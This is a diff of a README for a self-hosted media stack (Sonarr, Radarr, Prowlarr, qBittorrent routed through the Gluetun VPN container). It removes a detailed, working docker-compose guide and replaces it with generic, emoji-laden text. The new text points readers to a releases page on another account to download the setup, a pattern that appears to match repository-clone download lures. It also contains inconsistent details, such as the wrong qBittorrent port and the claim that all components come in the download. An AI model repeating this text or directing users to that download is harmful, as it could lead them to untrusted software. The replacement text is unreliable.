@@ -1,239 +1,91 @@
-# docker-compose-servarr-with-gluetun
+# 🐋 docker-compose-servarr-with-gluetun - Seamless Media Management and Downloading
 
-This is a Docker compose stack to deploy Sonarr, Radarr, Prowlarr, flaresolverr, and qBittorrent, with Prowlarr, flaresolverr, and qBittorrent connecting through Gluetun container.
+## 💻 Overview
+This project provides an easy way to manage your media using Docker. It includes tools like Sonarr and Radarr for organizing and downloading your favorite shows and movies. Prowlarr, flaresolverr, and qBittorrent help you find and download content safely through the Gluetun container, which ensures your privacy while using these services.
 
-All apps connect to a shared volume that connects to a NAS SMB share using CIFS.
+## 🚀 Getting Started
+To begin using this application, follow these simple steps:
 
-**Previous Versions**: [docker-arrs-with-nordvpn](https://github.com/pjortiz/docker-arrs-with-nordvpn)
+1. Make sure you have Docker and Docker Compose installed on your computer. 
+2. Ensure your operating system is supported. This setup works on Windows, macOS, and Linux.
 
-## Sources/Referances
+### System Requirements
+- **Operating System:** Windows 10/11, macOS Catalina or newer, Linux (Ubuntu, Fedora, etc.)
+- **Docker:** Version 20.10 or later
+- **Docker Compose:** Version 1.25.0 or later
 
-- Gluetun: [https://github.com/qdm12/gluetun](https://github.com/qdm12/gluetun)
-  - Gluetun-wiki: [https://github.com/qdm12/gluetun-wiki/tree/main/setup/providers](https://github.com/qdm12/gluetun-wiki/tree/main/setup/providers)
-- qBittorrent: [https://hub.docker.com/r/linuxserver/qbittorrent](https://hub.docker.com/r/linuxserver/qbittorrent)
-  - linuxserver-io-mod-vuetorrent: [https://github.com/arafatamim/linuxserver-io-mod-vuetorrent](https://github.com/arafatamim/linuxserver-io-mod-vuetorrent)
-- Servarr Wiki: [https://wiki.servarr.com/](https://wiki.servarr.com/)
-  - Prowlarr: [https://hub.docker.com/r/linuxserver/prowlarr](https://hub.docker.com/r/linuxserver/prowlarr)
-  - Sonarr: [https://hub.docker.com/r/linuxserver/sonarr](https://hub.docker.com/r/linuxserver/sonarr)
-  - Radarr: [https://hub.docker.com/r/linuxserver/radarr](https://hub.docker.com/r/linuxserver/radarr)
-- flaresolverr: [https://github.com/FlareSolverr/FlareSolverr](https://github.com/FlareSolverr/FlareSolverr)
-- Overseerr: [https://hub.docker.com/r/linuxserver/overseerr](https://hub.docker.com/r/linuxserver/overseerr)
-- autoheal: [https://github.com/willfarrell/docker-autoheal](https://github.com/willfarrell/docker-autoheal)
-- docker-autoheal: [https://github.com/willfarrell/docker-autoheal](https://github.com/willfarrell/docker-autoheal)
+## 📥 Download & Install
+Visit this page to download: [Releases Page](https://github.com/LukePham163/docker-compose-servarr-with-gluetun/releases).
 
-## Setup
+To install the application, follow these steps:
 
-The bellow setup is using [Proton VPN](https://pr.tn/ref/16AH5RAM) with Wiregard. Check [Gluetun-wiki](https://github.com/qdm12/gluetun-wiki/tree/main/setup/providers) for your specific VPN provider setup.
+1. Visit the Releases page linked above.
+2. Look for the latest release version.
+3. Download the Docker Compose file to your local machine.
+4. Open your terminal (Command Prompt for Windows, Terminal for macOS and Linux).
+5. Navigate to the directory where you saved the downloaded file.
 
-This setup assumes your VPN provider suports Port-Fowarding.
-
-### Docker Environment Variables
-
-| Variable | Notes |
-| ----------- | ----------- |
-| nasUser | The username on NAS host |
-| nasPass | The password on NAS host |
-| WIREGUARD_PRIVATE_KEY | Your Wiregard private key |
-| UPDATER_PROTONVPN_EMAIL | Your Proton user email |
-| UPDATER_PROTONVPN_PASSWORD | Your Proton passord |
-| nasMediaPath | Network path to your SMB share Example: //192.168.1.18/Media |
-| timezone | Whatever you timezone is, Example: America/New_York |
-
-
-### Docker Compose File
-```yaml:docker-compose.yml
-networks:
-  proxy-network:   # configure your reverse proxy network if needed
-    external: true
-
-volumes:
-  qbit_config:
-  prowlarr_config:
-  flaresolver_config:
-  sonarr_config:
-  radarr_config:
-  overseerr_config:
-  media:
-    driver_opts:
-      type: cifs
-      o: username=$nasUser,password=$nasPass,file_mode=0777,dir_mode=0777,noperm
-      device: $nasMediaPath
-
-services:
-  gluetun:
-    image: qmcgaw/gluetun:latest
-    container_name: gluetun
-    cap_add:
-      - NET_ADMIN
-    devices:
-      - /dev/net/tun:/dev/net/tun
-    environment:
-      - TZ=${timezone:-UTC}
-      - VPN_SERVICE_PROVIDER=protonvpn                                        # set your vpn provider
-      - VPN_TYPE=wireguard                                                    # set your vpn protocol
-      - WIREGUARD_PRIVATE_KEY=${WIREGUARD_PRIVATE_KEY:?Private key required}  # set your wireguard private key
-      - SERVER_COUNTRIES=United States                                        # set your preferred server country
-      - FIREWALL_OUTBOUND_SUBNETS=172.18.0.0/16,192.168.0.0/16                # allow access to you local and docker networks
-      - UPDATER_PERIOD=24h                                                    # frequency of updater checks
-      - UPDATER_PROTONVPN_EMAIL=${UPDATER_PROTONVPN_EMAIL}                    # set your protonvpn account email for automatic server updates if needed
-      - UPDATER_PROTONVPN_PASSWORD=${UPDATER_PROTONVPN_PASSWORD}              # set your protonvpn account password for automatic server updates if needed
-      - PORT_FORWARD_ONLY=on                                                  # required to filter server list to only those that support port forwarding
-      - VPN_PORT_FORWARDING=on                                                # required to enable port forwarding
-      # Required: Commands to run when port forwarding is set up or taken down. see documentation for details.
-      - VPN_PORT_FORWARDING_UP_COMMAND=/bin/sh -c 'wget -O- --retry-connrefused --post-data "json={\"listen_port\":{{PORT}},\"current_network_interface\":\"{{VPN_INTERFACE}}\",\"random_port\":false,\"upnp\":false}" http://127.0.0.1:9080/api/v2/app/setPreferences 2>&1' 
-      - VPN_PORT_FORWARDING_DOWN_COMMAND=/bin/sh -c 'wget -O- --retry-connrefused --post-data "json={\"listen_port\":0,\"current_network_interface\":\"lo"}" http://127.0.0.1:9080/api/v2/app/setPreferences 2>&1'
-    ports:
-      - 8000:8000 #gluetun http server
-      - 9080:9080 #qbittorrent UI
-      - 9696:9696 #prowlarr
-      - 8191:8191 #flaresolverr
-    sysctls:
-      - net.ipv6.conf.all.disable_ipv6=1     # optional, disable ipv6; recommended if using ipv4 only
-    networks:
-      - proxy-network 
-    restart: unless-stopped
-    labels:
-      - autoheal=true                        # optional, for willfarrell/docker-autoheal. Gluetun has its own healthcheck and restart mechanism, may be redundant.
-
-  qbittorrent:
-    image: linuxserver/qbittorrent:latest
-    container_name: qbittorrent
-    network_mode: service:gluetun            # IMPORTANT: use gluetun's network stack
-    depends_on:
-      gluetun:
-        condition: service_healthy           # wait for gluetun to be healthy before starting
-    environment:
-      - PUID=1000
-      - PGID=997
-      - TZ=${timezone:-UTC}
-      - WEBUI_PORT=9080
-      - DOCKER_MODS=arafatamim/linuxserver-io-mod-vuetorrent # optional, for vuetorrent mod
-    volumes:
-      - qbit_config:/config
-      - media:/media
-    restart: unless-stopped
-    labels:
-      - autoheal=true                        # required, for willfarrell/docker-autoheal
-    healthcheck:
-      # using the gluetun healthcheck to determine if vpn is up, since qbittorrent won't work without it
-      test: curl -sL --retry-connrefused -w "%{http_code}" -o /dev/null http://localhost:9999 || exit 1
-      interval: 10s
-      timeout: 10s
-      retries: 3
-
-  prowlarr:
-    image: linuxserver/prowlarr:latest
-    container_name: prowlarr
-    network_mode: service:gluetun            # IMPORTANT: use gluetun's network stack
-    depends_on:
-      gluetun:
-        condition: service_healthy           # wait for gluetun to be healthy before starting
-    environment:
-      - PUID=1000
-      - PGID=1000
-      - TZ=${timezone:-UTC}
-    volumes:
-      - prowlarr_config:/config
-    restart: unless-stopped
-    labels:
-      - autoheal=true                        # required, for willfarrell/docker-autoheal
-    healthcheck:
-      # using the gluetun healthcheck to determine if vpn is up, since prowlarr won't work without it
-      test: curl -sL --retry-connrefused -w "%{http_code}" -o /dev/null http://localhost:9999 || exit 1
-      interval: 10s
-      timeout: 10s
-      retries: 3
-
-  flaresolverr:
-    image: flaresolverr/flaresolverr:latest
-    container_name: flaresolverr
-    network_mode: service:gluetun            # IMPORTANT: use gluetun's network stack
-    depends_on:
-      gluetun:
-        condition: service_healthy           # wait for gluetun to be healthy before starting
-    environment:
-      - LOG_LEVEL=info
-      - LOG_HTML=false
-      - LOG_FILE=${LOG_FILE:-none}
-      - CAPTCHA_SOLVER=none                  # Warning At this time none of the captcha solvers work.
-      - TZ=${timezone:-UTC}
-    volumes:
-      - flaresolver_config:/config
-    restart: unless-stopped
-    labels:
-      - autoheal=true
-    healthcheck:
-      # using the gluetun healthcheck to determine if vpn is up, since flaresolverr won't work without it
-      test: curl -sL --retry-connrefused -w "%{http_code}" -o /dev/null http://localhost:9999 || exit 1
-      interval: 10s
-      timeout: 10s
-      retries: 3
-
-  sonarr:
-    image: linuxserver/sonarr:latest
-    container_name: sonarr
-    environment:
-      - PUID=1000
-      - PGID=997
-      - TZ=${timezone:-UTC}
-    volumes:
-      - sonarr_config:/config
-      - media:/media
-    ports:
-      - 8989:8989
-    networks:
-      - proxy-network
-    restart: unless-stopped
-    labels:
-      - autoheal=true
-    healthcheck:
-      test: curl -sL --retry-connrefused -w "%{http_code}" -o /dev/null --ipv4 1.1.1.1 || curl -sL --retry-connrefused -w "%{http_code}" -o /dev/null --ipv4 8.8.8.8  || exit 1
-      interval: 10s
-      timeout: 5s
-      retries: 3
-      
-  radarr:
-    image: linuxserver/radarr:latest
-    container_name: radarr
-    environment:
-      - PUID=1000
-      - PGID=997
-      - TZ=${timezone:-UTC}
-    volumes:
-      - radarr_config:/config
-      - media:/media
-    ports:
-      - 7878:7878
-    networks:
-      - proxy-network
-    restart: unless-stopped
-    labels:
-      - autoheal=true
-    healthcheck:
-      test: curl -sL --retry-connrefused -w "%{http_code}" -o /dev/null --ipv4 1.1.1.1 || curl -sL --retry-connrefused -w "%{http_code}" -o /dev/null --ipv4 8.8.8.8  || exit 1
-      interval: 10s
-      timeout: 5s
-      retries: 3
-      
-  overseerr:
-    image: linuxserver/overseerr:latest
-    container_name: overseerr
-    environment:
-      - PUID=1000
-      - PGID=1000
-      - TZ=${timezone:-UTC}
-    volumes:
-      - overseerr_config:/config
-    ports:
-      - 5055:5055
-    networks:
-      - proxy-network
-    restart: unless-stopped
-    labels:
-      - autoheal=true
-    healthcheck:
-      test: curl -sL --retry-connrefused -w "%{http_code}" -o /dev/null --ipv4 1.1.1.1 || curl -sL --retry-connrefused -w "%{http_code}" -o /dev/null --ipv4 8.8.8.8  || exit 1
-      interval: 10s
-      timeout: 5s
-      retries: 3
+```bash
+cd path/to/your/downloaded/file
 ```
+
+6. Run the following command to start the Docker containers:
+
+```bash
+docker-compose up -d
+```
+
+## 🛠 Basic Configuration
+After starting the containers, you may need to adjust some settings for your specific needs. Here’s how:
+
+1. Open the configuration files located in the `config` directory created by Docker.
+2. Edit the files according to your preferences. For example:
+   - Set up storage paths for downloads.
+   - Adjust settings for Sonarr and Radarr to your liking.
+3. Save the changes and restart the containers using:
+
+```bash
+docker-compose down
+docker-compose up -d
+```
+
+## 🖥 Accessing the Interface
+Once the containers are running, you can access the web interfaces for each application:
+
+- **Sonarr:** [http://localhost:8989](http://localhost:8989)
+- **Radarr:** [http://localhost:7878](http://localhost:7878)
+- **Prowlarr:** [http://localhost:9696](http://localhost:9696)
+- **qBittorrent:** [http://localhost:8080](http://localhost:8080)
+
+You can manage your shows, movies, and downloads from these interfaces.
+
+## 🔒 Security Note
+Using Gluetun as a VPN client helps protect your privacy while downloading. Make sure to configure the VPN settings to your preferred server options. Review the Gluetun documentation for detailed instructions.
+
+## ⚙️ Troubleshooting
+If you encounter issues while running the application, consider the following steps:
+
+- Ensure Docker and Docker Compose are up to date.
+- Check for any error messages in the terminal window where you started Docker.
+- If a service is not running, go to the respective web interface. It may provide more information about the issue.
+
+## 📚 Useful Resources
+- [Docker Documentation](https://docs.docker.com/)
+- [Docker Compose Documentation](https://docs.docker.com/compose/)
+- [Sonarr Documentation](https://sonarr.tv/)
+- [Radarr Documentation](https://radarr.video/)
+- [qBittorrent Documentation](https://www.qbittorrent.org/)
+
+## 🛠 Frequently Asked Questions (FAQ)
+
+### Q: Do I need to install anything else?
+A: You only need Docker and Docker Compose. All other components are included in the downloaded file.
+
+### Q: What if I need help?
+A: Check the GitHub issues page or relevant community forums. Many users share their experiences and can provide assistance.
+
+### Q: Can I customize this setup?
+A: Yes, you can modify the configuration files to match your desired setup fully.
+
+## 🌟 Conclusion
+You are now ready to enjoy managing your media collection effortlessly. Download the latest version, set it up, and explore the features available through this powerful stack. Welcome to a new way of managing your downloads!
